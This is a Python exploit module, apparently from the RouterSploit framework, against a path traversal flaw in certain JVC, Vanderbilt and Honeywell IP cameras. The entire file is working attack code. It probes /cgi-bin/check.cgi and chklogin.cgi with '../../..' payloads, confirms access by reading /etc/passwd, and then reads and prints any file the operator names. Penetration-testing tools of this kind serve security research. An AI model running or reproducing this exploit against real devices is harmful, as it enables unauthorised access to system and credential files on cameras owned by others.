from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    __info__ = {
        "name": "JVC & Vanderbilt & Honeywell IP-Camera Path Traversal",
        "description": "Module exploits JVC IP-Camera VN-T216VPRU, Vanderbilt IP-Camera CCPW3025-IR / CVMW3025-IR and Honeywell "
                       "IP-Camera HICC-1100PT Path Traversal vulnerability. If target is vulnerable it is possible to read file "
                       "from the filesystem.",
        "authors": (
            "Yakir Wizman",  # vulnerability discovery
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "https://www.exploit-db.com/exploits/40281/",
        ),
        "devices": (
            "JVC IP-Camera VN-T216VPRU",
            "Vanderbilt IP-Camera CCPW3025-IR / CVMW3025-IR",
            "Honeywell IP-Camera HICC-1100PT"
        ),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    filename = OptString("/etc/passwd", "File to read from the filesystem")

    def __init__(self):
        self.resources = (
            "/cgi-bin/check.cgi?file=../../..{}",
            "/cgi-bin/chklogin.cgi?file=../../..{}"
        )

        self.valid_resource = None

    def run(self):
        if self.check():
            print_success("Target appears to be vulnerable.")

            path = self.valid_resource.format(self.filename)

            response = self.http_request(
                method="GET",
                path=path,
            )

            if response is None:
                print_error("Error with reading response")
                return

            if response.text:
                print_status("Reading file: {}".format(self.filename))
                print_info(response.text)
            else:
                print_error("Exploit failed - empty response")

        else:
            print_error("Exploit failed - target seems to be not vulnerable")

    @mute
    def check(self):
        filename = "/etc/passwd"
        for resource in self.resources:
            path = resource.format(filename)

            response = self.http_request(
                method="GET",
                path=path
            )

            if response and utils.detect_file_content(response.text, "/etc/passwd"):
                self.valid_resource = resource
                return True  # target is vulnerable

        return False  # target is not vulnerable
